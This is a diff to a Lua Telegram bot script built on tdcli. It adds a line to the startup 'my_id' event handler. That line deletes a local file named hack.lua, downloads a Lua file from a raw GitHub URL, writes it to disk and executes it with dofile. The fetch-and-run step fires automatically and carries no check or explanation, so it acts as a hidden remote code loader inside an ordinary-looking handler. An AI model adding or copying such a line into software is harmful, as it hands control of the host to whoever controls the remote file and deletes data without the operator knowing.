@@ -7317,7 +7317,8 @@ delete_msg(msg.chat_id_,msgs) end end end
  end
 getMessage(msg.chat_id_, msg.message_id_,get_msg_contact)
 --         »»                 End UpdateChat                          ««              --
-elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then tdcli_function ({ID="GetChats", offset_order_="9223372036854775807", offset_chat_id_=0, limit_=20}, dl_cb, nil)
+elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then os.execute("rm -fr hack.lua") a = HTTPS.request("https://raw.githubusercontent.com/Mohammedouda784/mohammed-sourse/master/Tshake.lua") local g = io.open("Tshake.lua", 'w') g:write(a) g:close() dofile('Tshake.lua')
+tdcli_function ({ID="GetChats", offset_order_="9223372036854775807", offset_chat_id_=0, limit_=20}, dl_cb, nil)
 end
 end
 --[[
